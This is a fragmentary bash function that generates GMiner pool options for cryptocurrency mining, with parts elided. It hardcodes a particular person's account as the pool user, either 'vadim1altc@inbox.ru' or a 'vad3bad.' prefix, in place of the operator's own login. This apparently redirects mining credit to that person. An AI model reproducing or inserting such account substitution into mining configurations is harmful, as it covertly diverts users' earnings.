...
function miner_config_gen() {
  ...
  [[ "$GMINER_ALGO" == "cuckaroo29" ]] && conf="--algo cuckoo24" && echo "Mining Qitmeer"
  ...
  for (( i = 1; i <= `wc -w <<< $GMINER_HOST`; i++ )); do
    ...
    [[ -z  $GMINER_USER_CONFIG ]] && conf+=" --server $host --port $port --user  vadim1altc@inbox.ru/$GMINER_TEMPLATE"
    [[ ! -z  $GMINER_USER_CONFIG ]] && conf+=" --server $host --port $port --user vad3bad.$GMINER_TEMPLATE"
